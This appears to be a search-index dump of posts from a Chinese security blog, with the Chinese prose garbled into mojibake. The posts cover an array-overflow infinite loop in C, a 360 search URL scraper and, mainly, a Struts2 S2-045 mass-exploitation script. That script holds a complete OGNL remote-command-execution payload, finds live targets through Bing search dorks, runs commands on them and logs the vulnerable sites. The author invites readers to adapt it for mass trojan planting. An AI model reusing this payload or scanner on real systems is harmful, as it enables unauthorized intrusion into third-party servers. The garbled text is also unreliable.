äº†1ï¼Œç°åœ¨ä¹Ÿå°±æ˜¯EBP-4ä¸­çš„å€¼å˜ä¸ºäº†0Aï¼Œcmpæ¯”è¾ƒä¹‹åEBP-4ä¸­çš„å€¼ä¾æ—§ä¸æ¯”0Aå¤§ï¼Œæ¥ç€æ‰§è¡Œmov ecx,dword ptr [ebp-4]ï¼Œæ­¤æ—¶ECXçš„å€¼å˜æˆäº†0Aï¼Œæ¥ç€æ‰§è¡Œmov dword ptr [ebp+ecx*4-2Ch],0ä¹Ÿå°±æ˜¯mov dword ptr [ebp-4],0\nç„¶åå‘¢ï¼Œä½ å‘ç°äº†ä»€ä¹ˆï¼Ÿï¼Ÿï¼Ÿå°±æ˜¯ä»–å–µçš„EBP-4ä¸­çš„å€¼å˜æˆäº†0\nå˜æˆ0ä»£è¡¨ç€ä»€ä¹ˆï¼Ÿï¼Ÿï¼ŸEBP-4ä¸­çš„å€¼æ˜¯æˆ‘ä»¬æ‹¿æ¥å¹²å˜›çš„ï¼Ÿæ˜¯ç”¨æ¥å’Œ0Aè¿›è¡Œcmpç„¶åå†³å®šæ˜¯å¦ç»“æŸå‡½æ•°çš„ï¼Œå¯æ˜¯æˆ‘ä»¬è¾›è¾›è‹¦è‹¦å¾ªç¯äº†10æ¬¡ï¼Œç¬¬11æ¬¡å…¨æ³¡æ±¤äº†ï¼Œå”¯ä¸€çš„å˜åŒ–å°±æ˜¯æ•°ç»„éƒ½æˆäº†0ï¼Œæ ˆé¡¶çš„å€¼å˜åŒ–äº†ä¸å°‘ï¼Œç„¶åå†æ¬¡cmpçš„æ—¶å€™ï¼Œ0å’Œ0Aæ¯”ï¼Œå†³å®šäº†ä½ è¿˜æ˜¯è¦å¾ªç¯ï¼Œä¸ç®¡å¤šå°‘æ¬¡ï¼Œæœ€åéƒ½ä¼šæŠŠä½ ç”¨æ¥è®¡æ•°çš„åœ°å€EBP-4ä¸­çš„å€¼æ¸…é›¶\nè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆä¸Šé¢è¿™æ®µcè¯­è¨€ä»£ç ä¼šä¸€ç›´ä¸åœåœ°å¾ªç¯çš„åŸå› \nè½¬è½½è¯·æ³¨æ˜å‡ºå¤„\n","permalink":"https://www.hacktech.cn/post/reverse-engineering-study-note-1-why-does-code-keep-running.html","summary":"\u003cp\u003eå¯¹äºä¸‹é¢è¿™æ®µcè¯­è¨€ä»£ç ä¼šä¸€ç›´ä¸åœåœ°å¾ªç¯ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 3\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 4\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 5\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 6\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 7\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 8\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 9\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e10\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e11\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e12\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e13\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e14\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e15\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e16\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e17\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e18\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e19\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-c\" data-lang=\"c\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\u0026lt;stdio.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eHelloWorld\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e a[] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e};\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e(i\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e; i\u003cspan style=\"color:#f92672\"\u003e\u0026lt;=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e; i\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\ta[i] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Hello World!\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e argc, \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e argv[])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eHelloWorld\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003egetchar\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e","title":"é€†å‘å­¦ä¹ ç¬”è®°ï¼ˆ1ï¼‰-ä¸ºä»€ä¹ˆä»£ç ä¸åœåœ°å¾ªç¯è¿è¡Œ"},{"content":"è¿˜æ˜¯ä¸ªæ¯”è¾ƒç®€å•çš„ï¼Œä¸åƒç™¾åº¦æœ‰åŠ å¯†ç®—æ³•\nåˆ†æ 1 http://www.so.com/link?url=http%3A%2F%2Fedu.sd.chinamobile.com%2Findex%2Fnews.do%3Faction%3DnoticeDetail%26id%3D22452\u0026amp;q=inurl%3Anews.do\u0026amp;ts=1488978912\u0026amp;t=89c5361a44fe3f52931d25c6de262bb\u0026amp;src=haosou ç½‘å€æ˜¯ä¸Šé¢è¿™ä¸ªæ ·å­ï¼Œæ²¡åŠ å¯†ç›´æ¥å–å°±å¥½äº†ï¼Œå»æ‰å¤´http://www.so.com/link?url=å’Œå°¾\u0026amp;q=ä¸€ç›´åˆ°æœ«å°¾çš„éƒ¨åˆ†ï¼Œå‰©ä¸‹çš„å°±å¯ä»¥åƒäº†\né‚£ä¹ˆè§„åˆ™æˆ‘ä»¬å°±å¯ä»¥å†™å‡ºæ¥äº†\n1 a[\u0026#39;href\u0026#39;][a[\u0026#39;href\u0026#39;].index(\u0026#39;?url=\u0026#39;):a[\u0026#39;href\u0026#39;].index(\u0026#39;\u0026amp;q=\u0026#39;)][5:] a['href']æ˜¯å¾…å¤„ç†ç½‘å€,a['href'].index('?url='):a['href'].index('\u0026amp;q=')çš„éƒ¨åˆ†ä¸º?url=http%3A%2F%2Fedu.sd.chinamobile.com%2Findex%2Fnews.do%3Faction%3DnoticeDetail%26id%3D22452\næœ€åè¿˜éœ€è¦ç”¨unquoteè§£ç \nåœ¨python3ä¸­æ˜¯urllib.parse.unquote åœ¨python2ä¸­æ˜¯urllib.unquote code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import requests from bs4 import BeautifulSoup from urllib.parse import unquote headers = { \u0026#34;User-Agent\u0026#34; : \u0026#34;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0\u0026#34; } #çˆ¬å–360æœç´¢å¼•æ“çœŸå®é“¾æ¥ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å…³é”®è¯strï¼Œç¬¬äºŒä¸ªå‚æ•°çˆ¬å–é¡µæ•°int def parse360(keyword, pagenum): keywordsBaseURL = \u0026#39;https://www.so.com/s?q=\u0026#39; + str(keyword) + \u0026#39;\u0026amp;pn=\u0026#39; pnum = 1 while pnum \u0026lt;= int(pagenum): baseURL = keywordsBaseURL + str(pnum) try: request = requests.get(baseURL, headers=headers) soup = BeautifulSoup(request.text, \u0026#34;html.parser\u0026#34;) urls = [unquote(a[\u0026#39;href\u0026#39;][a[\u0026#39;href\u0026#39;].index(\u0026#39;?url=\u0026#39;):a[\u0026#39;href\u0026#39;].index(\u0026#39;\u0026amp;q=\u0026#39;)][5:]) for a in soup.select(\u0026#39;li.res-list \u0026gt; h3 \u0026gt; a\u0026#39;)] for url in urls: yield url except: yield None finally: pnum += 1 ç”¨æ³•ç¤ºä¾‹:\n1 2 3 4 5 6 7 8 9 def main(): for url in parse360(\u0026#34;keyword\u0026#34;,10): if url: print url else: continue if __name__ == \u0026#39;__main__\u0026#39;: main() æœ€åä¸Šä¸€å¼ æµ‹è¯•å›¾ è½¬è½½è¯·æ³¨æ˜å‡ºå¤„\n","permalink":"https://www.hacktech.cn/post/360-search-engine-get-realurl-with-python.html","summary":"\u003cp\u003eè¿˜æ˜¯ä¸ªæ¯”è¾ƒç®€å•çš„ï¼Œä¸åƒç™¾åº¦æœ‰åŠ å¯†ç®—æ³•\u003c/p\u003e\n\u003ch1 id=\"åˆ†æ\"\u003eåˆ†æ\u003c/h1\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehttp://www.so.com/link?url=http%3A%2F%2Fedu.sd.chinamobile.com%2Findex%2Fnews.do%3Faction%3DnoticeDetail%26id%3D22452\u0026amp;q=inurl%3Anews.do\u0026amp;ts=1488978912\u0026amp;t=89c5361a44fe3f52931d25c6de262bb\u0026amp;src=haosou\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eç½‘å€æ˜¯ä¸Šé¢è¿™ä¸ªæ ·å­ï¼Œæ²¡åŠ å¯†ç›´æ¥å–å°±å¥½äº†ï¼Œå»æ‰å¤´\u003ccode\u003ehttp://www.so.com/link?url=\u003c/code\u003eå’Œå°¾\u003ccode\u003e\u0026amp;q=\u003c/code\u003eä¸€ç›´åˆ°æœ«å°¾çš„éƒ¨åˆ†ï¼Œå‰©ä¸‹çš„å°±å¯ä»¥åƒäº†\u003c/p\u003e","title":"360æœç´¢å¼•æ“å–çœŸå®åœ°å€-pythonä»£ç "},{"content":"ä»Šå¤©æ™šä¸Šçœ‹è€é“ä»¬åœ¨ç¾¤é‡Œå°±è¿™ä¸ªst2-045æ¼æ´è®¨è®ºå¾—ç«çƒ­ï¼Œä¸ªäººä¸å¤ªå–œæ¬¢æ—¥ç«™ï¼Œæœ¬æ¥æƒ³ç›´æ¥å†™ä¸ªæ‰¹é‡æŒ‚é©¬çš„ä¸œè¥¿ï¼Œä½†æ˜¯æƒ³æƒ³è¿˜æ˜¯ç®—äº†ï¼Œå¦‚æœä½ æœ‰å…´è¶£ï¼Œæ”¹æ”¹ä¹Ÿå¾ˆå®¹æ˜“ï¼Œåæ­£ä¸å…³æˆ‘çš„äº‹\næµ‹è¯•å›¾ 2017-3-8æ›´æ–°\nå¢åŠ äº†å¯¹.doå…³é”®è¯çš„æ”¯æŒï¼Œå¹¶ä¸”æ”¯æŒä»»ä½•å…³é”®è¯äº†ï¼Œä¹‹å‰æˆ‘åªè€ƒè™‘åˆ°äº†.actionå…³é”®è¯å¹¶ä¸”å†™æ­»äº†è§„åˆ™ï¼Œpyç‰ˆæœ¬å·²ç»æ›´æ–°ï¼Œwinç‰ˆçš„exeæœªæ›´æ–°ï¼Œéœ€è¦çš„è‡ªè¡Œç”¨pyinstalleræ‰“åŒ…ä¸ºexe ä¹‹å‰é‡‡ç”¨whoamiå¦‚æœè¿”å›200çŠ¶æ€ç å°±åˆ¤æ–­å­˜åœ¨æ¼æ´ï¼Œä½†æ˜¯ç°åœ¨å¾ˆå¤šå·²ç»ä¿®å¤äº†ï¼Œå¯¼è‡´è®¿é—®ä¹‹åä¾æ—§ä¼šè·³åˆ°æ­£å¸¸é¡µé¢è¿”å›200çŠ¶æ€ç ï¼Œäºæ˜¯æˆ‘æ”¹äº†ä¸€ä¸‹åˆ¤æ–­ï¼Œæ‰§è¡Œå‘½ä»¤echo xxxxï¼Œå¦‚æœè¿”å›ç»“æœä¸­å«æœ‰xxxxå°±è¯æ˜æ¼æ´å­˜åœ¨ winç‰ˆexeå·²ç»æ‰“åŒ… é‡è¦ï¼šå»ºè®®å¤§å®¶éƒ½ä½¿ç”¨pyç‰ˆæœ¬ï¼Œç»è¿‡ç¾¤å‹æµ‹è¯•ï¼Œexeç‰ˆæœ¬å¯¹ä¸­æ–‡å…³é”®è¯çš„æ”¯æŒä¸å¤ªå¥½ï¼Œä¼šå‡ºç°é”™è¯¯ï¼Œå¦‚æœä½¿ç”¨ä¸Šæœ‰é—®é¢˜å¯è¯„è®º exeç‰ˆæœ¬ä¼šå‡ºç°æ‰«æè¿‡æ…¢çš„æƒ…å†µï¼Œå¼ºçƒˆå»ºè®®pyç‰ˆæœ¬ï¼Œé‰´äºæœ‰äº›æœ‹å‹è¯´ä¸ä¼šé…ç½®pythonç¯å¢ƒï¼Œæˆ‘åœ¨ä¸‹é¢ç»™å‡ºäº†ä¾‹å­ æœ‰äº›æœ‹å‹è¯´è‡ªå®šä¹‰å…³é”®å­—å­—å…¸å‡ºé”™ï¼Œè¿™é‡Œè¦æä¸€å¥ï¼Œä½ çš„å­—å…¸txtçš„ç¼–ç éœ€è¦æ˜¯utf-8ï¼Œæœ‰äº›ä¸œè¥¿å› ä¸ºå†™çš„æ¯”è¾ƒå¿«æ²¡è€ƒè™‘å¤ªå…¨ï¼Œè§è°… ä¾èµ–åŒ…çš„å®‰è£…\n1 2 3 4 5 //é¦–å…ˆä½ éœ€è¦å®‰è£…ä¸€ä¸ªpythonï¼Œåœ¨å®‰è£…å›¾ä¸­è®°å¾—æŠŠæœ‰pipçš„é€‰é¡¹å’Œadd python to pathç±»ä¼¼çš„é€‰é¡¹å‹¾é€‰ä¸Šï¼Œç„¶åå®‰è£…å®Œæˆåæ‰§è¡Œpython -versionå’Œpip //å¦‚æœæ‰§è¡Œpython -versionæé†’ä½ æœ‰é—®é¢˜ï¼Œè¯•ç€é‡å¯ä¸€ä¸‹cmdæˆ–è€…ç”µè„‘ï¼Œæˆ–è€…æ£€æŸ¥ä½ çš„pathç¯å¢ƒå˜é‡ä¸‹æœ‰æ²¡æœ‰pythonçš„å®‰è£…çš„è·¯å¾„ï¼Œæ²¡æœ‰çš„è¯å°±åŠ ä¸Š //å¦‚æœæ­£å¸¸è¯æ˜ç¯å¢ƒå®‰è£…æˆåŠŸï¼Œå¦‚æœæ‰§è¡Œpipæé†’ä½ æ²¡æœ‰pipï¼Œå°±æŠŠä½ pythonå®‰è£…è·¯å¾„ä¸‹çš„Scriptsç›®å½•åŠ åˆ°pathç¯å¢ƒå˜é‡ï¼Œç„¶ååœ¨å‘½ä»¤è¡Œåœ¨æ‰§è¡Œä»¥ä¸‹ä»£ç  pip install requests pip install beautifulsoup4 å¯¹äºæ­¤è„šæœ¬æ‰€æ”¾ç½®æ–‡ä»¶å¤¹ä¸‹å¿…é¡»æœ‰keyword.txtç”¨æ¥å­˜æ”¾ä¸€è¡Œè¡Œçš„å…³é”®è¯ æœ€å¼€å§‹æ˜¯æ‰“ç®—ç›´æ¥å…¨éƒ¨è¯»å–ç„¶åä¸€ä¸ªä¸€ä¸ªè·‘ï¼Œä¸è¿‡æ„Ÿè§‰æ—¶é—´å¤ªæ¼«é•¿ï¼Œæµ‹è¯•æ—¶é—´å¤ªä¹… åæ¥æ”¹æˆå…³é”®è¯å°±æ˜¯è‡ªå·±è¾“å…¥ï¼Œä½†æ˜¯åˆæ„Ÿè§‰å¤ªéº»çƒ¦ ç„¶åå°±å˜æˆäº†ç°åœ¨çš„è¯»å–å…³é”®è¯ç„¶åæ ‡å·ç›´æ¥è¾“å…¥åºå·å°±å¯ä»¥ é€”ä¸­é‡åˆ°äº†æœ‰çš„ç½‘å€ç›´æ¥æ‹’ç»è®¿é—®å¯¼è‡´æŠ¥é”™ï¼Œè¿˜æœ‰çš„è¶…æ—¶ä¸€ç›´ä¸è¿”å›æŠ¥æ–‡ï¼Œè¿™äº›éƒ½è§£å†³äº†ï¼Œä¸ªäººæµ‹è¯•çš„ç»“æœè¿˜å¯ä»¥ï¼Œç»“æœä¿å­˜åœ¨ä¸€ä¸ªtxtä¸‹ï¼Œè‡³äºä½ æƒ³å†å¹²äº›ä»€ä¹ˆï¼Œä¸å…³æˆ‘çš„äº‹æƒ…äº†\nè¯´æ˜ ä¾‹å­ï¼š\n1 python s2-045.py 9 10 ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä½ çš„æ–‡ä»¶åï¼Œç¬¬äºŒä¸ªæ˜¯å…³é”®è¯æ‰€å¯¹åº”çš„åºå·ï¼Œç¬¬ä¸‰ä¸ªæ˜¯ä½ éœ€è¦çˆ¬è¡Œçš„é¡µæ•° åºå·ä¸å…³é”®è¯çš„å¯¹åº”ï¼Œå¯ä»¥ç›´æ¥è¿è¡Œpython s2-045.pyå°±å¯ä»¥äº§çœ‹å¸®åŠ© è„šæœ¬é‡‡ç”¨çš„bingæœç´¢å¼•æ“ï¼Œæ–‡ä»¶æˆ‘ä¼šæ‰“åŒ…åœ¨ä¸‹é¢\nä¸Šä»£ç ,python2å’Œ3é€šç”¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 # encoding:utf-8 import sys,requests from bs4 import BeautifulSoup keyword = {} with open(\u0026#34;keyword.txt\u0026#34;) as f: i = 0 for keywordLine in f: keyword[str(i)] = keywordLine.strip() i += 1 usage = \u0026#39;\u0026#39;\u0026#39; usage : python s2-045.py 0 10 first parameter is your filename second parameter is your keyword\u0026#39;s number which will be used by Bing Third parameter is the page number you want to crawl\\n\u0026#39;\u0026#39;\u0026#39; def poc(actionURL): data = \u0026#39;--447635f88b584ab6b8d9c17d04d79918\\ Content-Disposition: form-data; name=\u0026#34;image1\u0026#34;\\ Content-Type: text/plain; charset=utf-8\\ \\ x\\ --447635f88b584ab6b8d9c17d04d79918--\u0026#39; header = { \u0026#34;Content-Length\u0026#34; : \u0026#34;155\u0026#34;, \u0026#34;User-Agent\u0026#34; : \u0026#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\u0026#34;, \u0026#34;Content-Type\u0026#34; : \u0026#34;%{(#nike=\u0026#39;multipart/form-data\u0026#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\u0026#39;com.opensymphony.xwork2.ActionContext.container\u0026#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\u0026#39;echo hereisaexp\u0026#39;).(#iswin=(@java.lang.System@getProperty(\u0026#39;os.name\u0026#39;).toLowerCase().contains(\u0026#39;win\u0026#39;))).(#cmds=(#iswin?{\u0026#39;cmd.exe\u0026#39;,\u0026#39;/c\u0026#39;,#cmd}:{\u0026#39;/bin/bash\u0026#39;,\u0026#39;-c\u0026#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\u0026#34;, } try: request = requests.post(actionURL, data=data, headers=header, timeout = 10) except: return \u0026#34;None\u0026#34;, \u0026#34;Refused\u0026#34; return request.text, request.status_code def returnURLList(): keywordsBaseURL = \u0026#39;http://cn.bing.com/search?q=\u0026#39; +keyword[sys.argv[1]]+ \u0026#39;\u0026amp;first=\u0026#39; n =0 i = 1 while n \u0026lt; int(sys.argv[2]): baseURL = keywordsBaseURL + str(i) try: req = requests.get(baseURL) soup = BeautifulSoup(req.text, \u0026#34;html.parser\u0026#34;) text = soup.select(\u0026#39;li.b_algo \u0026gt; h2 \u0026gt; a\u0026#39;) if \u0026#39;.action\u0026#39; in keyword[sys.argv[1]]: standardURL = [url[\u0026#39;href\u0026#39;][:url[\u0026#39;href\u0026#39;].index(\u0026#39;.action\u0026#39;)]+\u0026#39;.action\u0026#39; for url in text if \u0026#39;.action\u0026#39; in url[\u0026#39;href\u0026#39;]] elif \u0026#39;.do\u0026#39; in keyword[sys.argv[1]]: standardURL = [url[\u0026#39;href\u0026#39;][:url[\u0026#39;href\u0026#39;].index(\u0026#39;.do\u0026#39;)]+\u0026#39;.do\u0026#39; for url in text if \u0026#39;.do\u0026#39; in url[\u0026#39;href\u0026#39;]] else: standardURL = [url[\u0026#39;href\u0026#39;] for url in text] except: print(\u0026#34;HTTPERROR\u0026#34;) continue i += 10 n += 1 yield standardURL def main(): if len(sys.argv) != 3: print(usage) for k,v in keyword.items(): print(\u0026#34;%s is %s\u0026#34;%(k, v)) sys.exit() for urlList in returnURLList(): for actionURL in urlList: text, code = poc(actionURL) if \u0026#39;hereisaexp\u0026#39; in text: print(str(code) + \u0026#34;----Successful----\u0026#34; + actionURL + \u0026#39;\\n\u0026#39;) with open(\u0026#34;AvailableURL.txt\u0026#34;,\u0026#34;a\u0026#34;) as f: f.write(actionURL+\u0026#39;\\n\u0026#39;) else: print(str(code)+\u0026#39;----\u0026#39;+actionURL+\u0026#39;\\n\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39;: main() 